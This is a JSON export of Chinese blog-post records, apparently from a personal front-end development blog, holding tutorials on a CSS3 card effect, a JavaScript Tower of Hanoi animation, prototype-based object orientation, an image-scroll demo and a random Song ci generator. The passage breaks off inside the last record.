{ "results": [
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp\u003e在前端开发中，我们常常需要在一个模块中显示更多的信息。\u003c/p\u003e\u003cp\u003e然而，如果把主次信息都杂糅在一起显示给用户是一种不太好的用户体验。\u003c/p\u003e\u003cp\u003e而这种卡片式切换展示方式是一种非常简单又友好的交互方式。\u003c/p\u003e\u003cp\u003e先看模块代码：\u003c/p\u003e\u003cpre class=\"brush:html;toolbar:false\"\u003e\u0026lt;div\u0026nbsp;class=\u0026#39;div\u0026#39;\u0026gt;\n\t\u0026lt;div\u0026nbsp;class=\u0026#39;wrap\u0026nbsp;tran\u0026#39;\u0026gt;\n\t\t\u0026lt;div\u0026nbsp;class=\u0026#39;left\u0026#39;\u0026gt;Div\u0026nbsp;A，重要的内容放在这里\u0026lt;/div\u0026gt;\n\t\t\u0026lt;div\u0026nbsp;class=\u0026#39;right\u0026#39;\u0026gt;Div\u0026nbsp;B\u0026nbsp;,可以在这里显示不重要的信息\u0026lt;/div\u0026gt;\n\t\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\u003c/pre\u003e\u003cp\u003e这种设计的思想在于把\u003cspan style=\"color: rgb(155, 187, 89);\"\u003e.div\u003c/span\u003e长宽固定。这样一般情况下里面的内容怎么变换不会影响\u003cspan style=\"color: rgb(155, 187, 89);\"\u003e.div\u003c/span\u003e外的内容。\u003cspan style=\"color: rgb(155, 187, 89);\"\u003e.wrap\u003c/span\u003e也是一个重要的div初始width和height与\u003cspan style=\"color: rgb(155, 187, 89);\"\u003ediv.left\u003c/span\u003e相同，css代码如下：\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:css;toolbar:false\"\u003e.div\u0026nbsp;.wrap{\n\tposition:relative;\n\twidth:100px;height:200px;\n\tborder:1px\u0026nbsp;solid\u0026nbsp;#ccc;\n\toverflow:hidden;\n}\n.div\u0026nbsp;.wrap:hover{\n\tz-index:2;\n\twidth:200px;\n\tborder:1px\u0026nbsp;solid\u0026nbsp;tomato;\n}\u003c/pre\u003e\u003cp\u003e然后把\u003cspan style=\"color: rgb(155, 187, 89);\"\u003ediv.right\u003c/span\u003e的设置绝对定位，left值为\u003cspan style=\"color: rgb(155, 187, 89);\"\u003ediv.left\u003c/span\u003e的width值。\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:css;toolbar:false\"\u003e.div\u0026nbsp;.right{\n\tposition:absolute;\n\ttop:0;left:100px;\n\tpadding:20px;\n\twidth:60px;height:160px;\n\tbackground-color:lightblue;\n}\u003c/pre\u003e\u003cp\u003e一切OK。。。\u003c/p\u003e\u003cp\u003e全部代码请查看源代码。\u003c/p\u003e",
        "createdAt": "2015-10-16T09:37:35.847Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-16T13:30:00.000Z"
        },
        "desc": "\u003cp\u003e用纯css3实现漂亮的卡片切换效果。\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003ciframe src=\"http://www.oshjf.com/blog/iframe/css3_card_roll_x/index.html\" width=\"340\" height=\"220\" scrolling=\"no\" frameborder=\"0\" align=\"\"\u003e\u003c/iframe\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "3fJkO3XhCC",
        "stamps": "css,卡片特效\n",
        "title": "Css3实现的卡片切换效果\n",
        "types": "b1e,b12e\n",
        "updatedAt": "2015-12-05T03:28:36.862Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e其实汉诺塔我们都写过, 这是递归思想里面的 \u0026quot;HelloWorld\u0026quot;, 不过以前写的代码的输出结果如下图\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151205/1449288986705721.png\" title=\"1449288986705721.png\" alt=\"blob.png\" style=\"float: right; width: 154px; height: 245px;\" width=\"154\" height=\"245\"/\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003efunction\u0026nbsp;h(n,\u0026nbsp;a,\u0026nbsp;b,\u0026nbsp;c){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(n\u0026nbsp;===\u0026nbsp;1)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;Move\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;n\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026nbsp;from\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;a\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026nbsp;to\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;c);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u0026nbsp;else\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;h(n\u0026nbsp;-1,\u0026nbsp;a,\u0026nbsp;c,\u0026nbsp;b);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;Move\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;n\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026nbsp;from\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;a\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026nbsp;to\u0026nbsp;\u0026quot;\u0026nbsp;+\u0026nbsp;c);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;h(n-1,\u0026nbsp;b,\u0026nbsp;a,\u0026nbsp;c);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n}\nh(10,\u0026nbsp;\u0026quot;a\u0026quot;,\u0026nbsp;\u0026quot;b\u0026quot;,\u0026nbsp;\u0026quot;c\u0026quot;)\n\n//\u0026nbsp;是的汉诺塔的核心代码只有\u0026nbsp;9\u0026nbsp;行\n//\u0026nbsp;但是,\u0026nbsp;这种输出结果真的是太难看懂了/(ㄒoㄒ)/~~\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 2em;\"\u003e\u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 2em;\"\u003e所以, 我写了这个demo. 代码并不复杂, 我来梳理一下主要的逻辑, 写的不好的地方, 欢迎大家指出啊...\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e(function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;设计思想是\u0026nbsp;:\u0026nbsp;俩个类,\u0026nbsp;一个main函数\n\u0026nbsp;\u0026nbsp;//\u0026nbsp;Rect\u0026nbsp;类封装了矩形(也就是一层楼)的所有属性及方法\n\u0026nbsp;\u0026nbsp;function\u0026nbsp;Rect(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.tower\u0026nbsp;=\u0026nbsp;null;\u0026nbsp;//\u0026nbsp;这层楼现在属于那一座塔\n\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;Rect.prototype\u0026nbsp;=\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;1.修改this.tower属性\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;2.调用this.moveTo方法\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;3.完成一层楼从一座塔移动到另一座塔\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;moveTo\u0026nbsp;:\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;this.tower.pushRect(this,\u0026nbsp;fn);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;};\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n\u0026nbsp;\u0026nbsp;//\u0026nbsp;Tower类封装了塔的所有属性和方法\n\u0026nbsp;\u0026nbsp;function\u0026nbsp;Tower(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.rects\u0026nbsp;=\u0026nbsp;[];\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;该塔拥有的楼层\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;...\n\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;Tower.prototype\u0026nbsp;=\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;pushRect\u0026nbsp;:\u0026nbsp;function\u0026nbsp;(rect,\u0026nbsp;fn)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;这是Tower类最核心的方法,\u0026nbsp;负责把一层楼移动到该座塔\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;\u0026nbsp;同时对dom的操作都在这里\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;rect\u0026nbsp;是Rect类的实例(对象)\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;fn\u0026nbsp;是回调函数,\u0026nbsp;因为在移动一层完成后才能移动另一层楼\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;};\n\u0026nbsp;\u0026nbsp;//\u0026nbsp;主函数\n\u0026nbsp;\u0026nbsp;function\u0026nbsp;main(){}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n\u0026nbsp;\u0026nbsp;$(dom).on(\u0026quot;click\u0026quot;,\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;main();\n\u0026nbsp;\u0026nbsp;});\n\u0026nbsp;\u0026nbsp;/*\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;PPS\u0026nbsp;:\u0026nbsp;其实我不敢说这种设计的理念就是最好的,\u0026nbsp;但至少它的逻辑很好理解,\u0026nbsp;面向对象程序设计是一段很长的路,\u0026nbsp;Keep\u0026nbsp;Moving!\n\u0026nbsp;\u0026nbsp;*/\n\u0026nbsp;\u0026nbsp;\n})();\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"https://github.com/AJLoveChina/ComputerScience/tree/master/hanoi\" target=\"_blank\" style=\"line-height: 32px; white-space: normal;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e跳转到Github源码\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"line-height: 32px;\"\u003e\u0026nbsp;\u0026nbsp;\u003c/span\u003e\u003ca href=\"http://www.meajax.com/myblog/iframe/hanoi/hanoi.html\" target=\"_blank\" style=\"line-height: 32px; white-space: normal;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e跳转到Demo\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"line-height: 32px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e演示\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 2em;\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-12-05T04:52:07.732Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-12-05T04:52:05.708Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;汉诺塔这个程序想必大家都写过, 的确, 这是很好的一个 \u0026quot;递归\u0026quot; 栗子. 而且, 递归 是软件开发中一个灰常重要的思想. 但是, 如果如果让我用JS来写一个汉诺塔, 它一定是下面这个样子 :\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151205/1449288702208747.gif\" title=\"1449288702208747.gif\" alt=\"hanoi.gif\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e如果感兴趣是如何实现的, 点击 Show Detail 吧 ^_^,\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"https://github.com/AJLoveChina/ComputerScience/tree/master/hanoi\" target=\"_blank\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e跳转到Github源码\u003c/span\u003e\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://www.meajax.com/myblog/iframe/hanoi/hanoi.html\" target=\"_blank\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e跳转到Demo\u003c/span\u003e\u003c/a\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px;\"\u003e演示\u003c/span\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "6BcfwmMb5b",
        "stamps": "Js,汉诺塔",
        "title": "亲,汉诺塔是这么玩的",
        "types": "b1e,b13e",
        "updatedAt": "2015-12-05T04:52:07.732Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e首先，我让你思考俩个问题，什么是面向对象？面向对象是为了什么？\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003eJs不同于Java等传统语言面向对象的写法，它没有类（class）的定义，同时在面向对象开发上做的也不够完善，没有很好的继承、重载与多态机制。\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e但是它的确能以面向对象方式开发，而且有自己独特的一套继承、多态写法！\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e首先我们来写一个简单的例子：\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003efunction\u0026nbsp;Say(\u0026nbsp;val\u0026nbsp;){\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//该函数体中的内容相当于\u0026nbsp;构造函数\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;this.words\u0026nbsp;=\u0026nbsp;val;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\n}\nSay.prototype\u0026nbsp;=\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;echo\u0026nbsp;:\u0026nbsp;function(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026nbsp;this.words\u0026nbsp;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n};\u003c/pre\u003e\u003cp\u003e上面这个Say函数并跟上一个prototype小尾巴就是传统面向对象中的“类”。\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e如何用这个函数创建对象呢？\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003evar\u0026nbsp;s\u0026nbsp;=\u0026nbsp;new\u0026nbsp;Say(\u0026nbsp;\u0026quot;Hello\u0026nbsp;World\u0026quot;\u0026nbsp;);\ns.echo();\u003c/pre\u003e\u003cp\u003enew是Js的关键字，用来创建对象（上面的s）。现在我们就可以用这个s对象来调用函数中的方法了！\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150715/1436969515127051.png\" title=\"1436969515127051.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:38:13.925Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-15T12:42:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e许多Js初学者都有这样的疑问，JS到底是不是一门面向对象的语言？肯定是，这不是我说的。Nicholas.C.Zakas在其著作《Javascript高级程序设计》第三版第6章隆重地介绍了Js的面向对象开发方式。然而很多人说JS不是，是因为Js面向对象开发的方式与众不同，让我细细说给你听\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0001.gif\"/\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "8aZh7lLYC0",
        "stamps": "JS,面向对象\n",
        "title": "浅谈Js面向对象\n",
        "types": "b1e,b13e\n",
        "updatedAt": "2015-12-05T03:28:34.960Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp\u003e此demo使用起来十分方便，HTML代码如下：\u003c/p\u003e\u003cp\u003e只需要把需要滚动的图片放在一个div容器内。\u003c/p\u003e\u003cpre class=\"brush:html;toolbar:false\"\u003e\u0026lt;!DOCTYPE\u0026nbsp;html\u0026gt;\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n\t\u0026lt;meta\u0026nbsp;charset=\u0026#39;UTF-8\u0026#39;\u0026nbsp;/\u0026gt;\n\t\u0026lt;title\u0026gt;Images\u0026nbsp;Roll\u0026nbsp;Horizontal\u0026lt;/title\u0026gt;\n\t\u0026lt;style\u0026gt;\n\t\t#container{\n\t\t\twidth:300px;height:200px;\n\t\t\tposition:relative;overflow:hidden;\n\t\t\tborder-radius:4px;\n\t\t\tbox-shadow:#333\u0026nbsp;0\u0026nbsp;0\u0026nbsp;2px;\n\t\t}\n\t\t#container\u0026nbsp;img{\n\t\t\tmax-width:100%;\n\t\t\tmax-height:100%;\n\t\t}\n\t\u0026lt;/style\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\n\u0026lt;div\u0026nbsp;id=\u0026#39;container\u0026#39;\u0026gt;\n\t\u0026lt;img\u0026nbsp;src=\u0026#39;http://www.oshjf.com/blog/iframe/imgsRollX/imgs/1.jpg\u0026#39;/\u0026gt;\n\t\u0026lt;img\u0026nbsp;src=\u0026#39;http://www.oshjf.com/blog/iframe/imgsRollX/imgs/2.jpg\u0026#39;/\u0026gt;\n\t\u0026lt;img\u0026nbsp;src=\u0026#39;http://www.oshjf.com/blog/iframe/imgsRollX/imgs/3.jpg\u0026#39;/\u0026gt;\n\u0026lt;/div\u0026gt;\n\n\n\u0026lt;script\u0026nbsp;src=\u0026#39;http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;script\u0026nbsp;src=\u0026#39;./js/index.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\n\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/pre\u003e\u003cp\u003e接下来我，我们来看一下Js的逻辑：\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e$(\u0026nbsp;document\u0026nbsp;).ready(function(){\n\tvar\u0026nbsp;prop\u0026nbsp;=\u0026nbsp;{};\n\tprop.div\u0026nbsp;=\u0026nbsp;$(\u0026#39;#container\u0026#39;)[0];\n\tEffect(\u0026nbsp;prop\u0026nbsp;).start();\t\n});\u003c/pre\u003e\u003cp\u003eEffect就是我们写的“类”（暂且就这么称呼吧），\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e我们来看看Effect的参数及方法：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150721/1437489569125738.png\" title=\"1437489569125738.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e调用是十分方便的，只需要把图片的容器作为prop的属性传递给Effect类就阔以了，Effect类会自动获取容器内部的图片，并自动为其添加样式。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150721/1437488853118380.png\" title=\"1437488853118380.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150721/1437488878111077.png\" title=\"1437488878111077.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e也许你会纳闷，为什么我们不把所有的方法都放在Effect的原型之中呢，这是因为放在原型中的都是公共的方法，什么意思呢？就是假如我现在要写一个图片水平滚动的模块，它也会用到Effect.addBalls，addStyle等方法。但是像Effect.moveTop，moveDown,show等等这些方法根据模块的不同是需要改变的，这也是一个模块的我们真正要关心的逻辑。\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e比如说，现在你又要写一个图片水平滚动的模块，就会发现也需要下面这些方法。\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150721/1437489494132245.png\" title=\"1437489494132245.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e这是为了以后继承考虑的。（其实，本来这个模块就是继承的写法，只是为了方便大家阅读，我把本来模块需要继承父级的方法，又写进了模块自己的原型中）\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e代码\u003ca href=\"https://github.com/AJLoveChina/WebEffect/tree/master/imgsRollY\" target=\"_blank\"\u003eGithub地址\u003c/a\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:35:58.082Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-08-10T11:27:00.000Z"
        },
        "desc": "\u003cp\u003e用Js实现一组图片的垂直方向滚动，我知道木有图片你们是不会进来的。\u003c/p\u003e\u003cp\u003edemo地址\u003ca href=\"http://www.oshjf.com/blog/iframe/imgsRollY/index.html\" target=\"_blank\"\u003e点击这里\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150721/1437488300962448.png\" title=\"1437488300962448.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "ATItDvWrt7",
        "stamps": "JS,图片滚动\n",
        "title": "图片垂直滚动demo\n",
        "types": "b1e,b13e\n",
        "updatedAt": "2015-12-05T03:28:40.444Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp\u003e话不多说，先看示例：\u003c/p\u003e\u003cp\u003e\u003ciframe src=\"http://www.oshjf.com/blog/iframe/songci/index.html\" width=\"280\" height=\"230\" scrolling=\"no\" frameborder=\"0\" align=\"\"\u003e\u003c/iframe\u003e\u003c/p\u003e\u003cp\u003e其实，电脑随机生成宋词的核心部分是“词频统计”，这个教程（JS实现）会在后续的博文介绍给大家。\u003c/p\u003e\u003cp\u003e那么这个栗子是怎么实现的呢？\u003c/p\u003e\u003cp\u003e首先我们需要单字（4059个）的集合和双字(4346)的“资源”集合。（这是“词频统计出来的”）\u003c/p\u003e\u003cp\u003e然后，你要知道的是：宋词的组成是有它的语法的，比如“明月别枝惊鹊，清风半夜鸣蝉”。都是俩个字俩个字的形式，数组模型就是[2,2,2,3,2,2,2] (其中2表示双字，3表示逗号，另外4表示句号，1表示单字)。\u003c/p\u003e\u003cp\u003e那么你知道《念奴娇》的数组模型是什么吗？\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0028.gif\"/\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003eyy.mode.llj=[2,2,3,2,2,1,2,4,2,2,2,1,3,2,1,2,4,2,2,2,1,3,2,2,1,2,4,2,2,2,1,3,2,1,2,4];\u003c/pre\u003e\u003cp\u003e然后遍历yy.mode.llj这个数组，1则输出单字，2输出双字，3输出逗号，4输出句号。（单字双字都是随机从“资源”集合获取的）\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e这样一首宋词就生成了。。\u003c/p\u003e\u003cp\u003e其实古人写诗写词就是喜欢用那几个词，什么“何处，东风，相思”，这都是从宋词全集里面统计出来的。你也用这几个词随机组合一下，哦也，也像回事了\u003cimg src=\"http://img.baidu.com/hi/face/i_f02.gif\"/\u003e\u003c/p\u003e\u003cp\u003e当然，无意冒犯文学党啊。。。\u003cimg src=\"http://img.baidu.com/hi/face/i_f32.gif\"/\u003e\u003c/p\u003e\u003cp\u003e有兴趣的童鞋可以试着做一个生成唐诗的demo哦~\u003c/p\u003e",
        "createdAt": "2015-10-16T09:38:54.677Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-14T13:00:00.000Z"
        },
        "desc": "\u003cp\u003e是否想过给妹纸写情诗却又不会执笔，\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0013.gif\"/\u003e\u003c/p\u003e\u003cp\u003e嘿嘿，这款宋词随机生成工具一定适合你。\u003c/p\u003e\u003cp\u003e而且代码开源，更有详细教程。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20151205/1449291562137761.png\" title=\"1449291562137761.png\" alt=\"QQ截图20151205125837.png\"/\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "Al5obDFGuR",
        "stamps": "JS,宋词\n",
        "title": "Js实现网页随机生成宋词\n",
        "types": "b1e,b12e,b13e",
        "updatedAt": "2015-12-05T04:59:30.093Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-11-01T12:04:36.472Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-11-01T12:04:35.852Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(12, 12, 12);\"\u003e\u0026nbsp;\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(12, 12, 12); font-size: 16px;\"\u003e第一次知道Github是在阿里的笔试中, 当时有一道题就是填写你的Github账号. 然而那个时候还不知道Github是个啥... \u0026nbsp;(好吧,这篇文章并不是聊笔试题)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(12, 12, 12); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;三年前, 我也曾是抱着\u0026quot;电子工程师\u0026quot;的梦想来到这里, 带着对 Mr.乔 的崇拜, 然而后来怎么就成了一位码农. 难道不想当数学家的厨子就一定不是好的工程师?\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(12, 12, 12); font-size: 